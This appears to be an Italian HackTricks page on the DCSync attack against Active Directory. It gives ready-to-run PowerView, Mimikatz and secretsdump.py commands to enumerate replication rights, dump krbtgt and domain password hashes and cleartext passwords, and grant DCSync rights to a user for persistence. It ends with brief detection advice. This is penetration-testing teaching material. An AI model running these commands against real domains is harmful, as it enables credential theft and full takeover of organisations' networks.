# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Il permesso **DCSync** implica avere questi permessi sul dominio stesso: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.

**Note Importanti su DCSync:**

- L'**attacco DCSync simula il comportamento di un Domain Controller e chiede ad altri Domain Controller di replicare informazioni** utilizzando il Directory Replication Service Remote Protocol (MS-DRSR). Poiché MS-DRSR è una funzione valida e necessaria di Active Directory, non può essere disattivata o disabilitata.
- Per impostazione predefinita solo i gruppi **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** hanno i privilegi richiesti.
- Se le password di qualsiasi account sono memorizzate con crittografia reversibile, è disponibile un'opzione in Mimikatz per restituire la password in chiaro.

### Enumerazione

Controlla chi ha questi permessi usando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Sfrutta Localmente
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Sfrutta Remotamente
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genera 3 file:

- uno con gli **hash NTLM**
- uno con le **chiavi Kerberos**
- uno con le password in chiaro dall'NTDS per qualsiasi account impostato con [**cifratura reversibile**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) abilitata. Puoi ottenere gli utenti con cifratura reversibile con

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistenza

Se sei un amministratore di dominio, puoi concedere queste autorizzazioni a qualsiasi utente con l'aiuto di `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Quindi, puoi **verificare se all'utente sono stati assegnati correttamente** i 3 privilegi cercandoli nell'output di (dovresti essere in grado di vedere i nomi dei privilegi all'interno del campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigazione

- Security Event ID 4662 (Audit Policy for object must be enabled) – È stata eseguita un'operazione su un oggetto
- Security Event ID 5136 (Audit Policy for object must be enabled) – Un oggetto del servizio directory è stato modificato
- Security Event ID 4670 (Audit Policy for object must be enabled) – I permessi su un oggetto sono stati modificati
- AD ACL Scanner - Crea e confronta report di ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Riferimenti

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
